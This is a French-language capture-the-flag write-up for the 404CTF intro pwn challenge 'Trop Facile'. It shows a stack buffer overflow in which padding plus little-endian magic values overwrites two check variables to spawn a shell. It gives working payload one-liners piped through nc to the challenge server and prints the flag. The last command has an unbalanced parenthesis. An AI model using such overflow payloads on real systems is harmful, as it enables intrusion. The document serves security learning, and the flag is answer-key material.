# Trop Facile



- Category: `Pwn`
- Points: `100` => `100`
- Difficulty: Intro
- Solves: `300`


**Description**

> Agent, suite à une mission périlleuse, vos collègues ont réussi à s'emparer d'un binaire s'exécutant sur une des machines de Hallebarde. Après une analyse poussée, ils ont réussi à extraire ce qui semblait être la meilleure version du code source. Vous êtes chargé de la dernière étape : essayez d'exploiter le binaire pour en tirer quelque chose.
>
>nc challenge.404ctf.fr 32458
>


**Attachments**

- `compromis.c, compromis`

### :book: Introduction

 Etant donne que c'etait mon tout premier chall de pwn c'etait plutot interessant et assez rapide a faire.

**Recon**
![home](![image](https://user-images.githubusercontent.com/64932654/167711362-83b80e2f-f083-4199-ac3a-598aba2f2f82.png))
- Le code source est relativement simple:
    - **Il y a une variable buf de 40bytes qui prend comme valeur un fgets de 49 bytes l'input**
    - **Une valeur check qui est egal a "0xcafebebe"**
    - **Une valeur key qui est egal a "0xdeadbeef"**
    - **On remarque que si key est egal a "0xcafebebe" et check a "0xdeadbeef" un shell se lance**
Il faut donc depasser sur les variables key et check pour ouvrir un shell.




En regardant un peu on peut voir que la fonction fgets recupere 48 bytes (qui vont donc faire depasser la variable buf sur key et check
Donc en theorie si on rentre en input ```python -c 'print("A"*40+"\xef\xbe\xad\xde\xbe\xbe\xfe\xca")' | ./compromis``` la pile devrait ressembler a ca: 


![pile](https://github.com/Numb3rsProprety/404CTF/blob/main/trop-facile/pile1.PNG)


On a donc reussi a depasser sur les variables check et key.

En appliquant: 


![shell](https://github.com/Numb3rsProprety/404CTF/blob/main/trop-facile/shellobtenu.PNG)


On obtient bien un message de reussite mais le shell ne reste pas.
Pour garder le controle sur l'entree standard il suffit d'executer


```(python -c 'print("A"*40+"\xef\xbe\xad\xde\xbe\xbe\xfe\xca")';cat) | ./compromis```

On arrive maintenant a executer des commandes :)

### :arrows_counterclockwise: Exploitation
Il nous suffit maintenant simplement d'executer la meme commande mais en redirigeant le pipe vers le serveur :

```python -c 'print("A"*40+"\xef\xbe\xad\xde\xbe\xbe\xfe\xca")';cat) | nc challenge.404ctf.fr 32458```


![flag](https://github.com/Numb3rsProprety/404CTF/blob/main/trop-facile/flag.PNG)



```

Flag: `404CTF{C_7r0P_F4C113_D3_PWN_14_H411384rD3}`


```

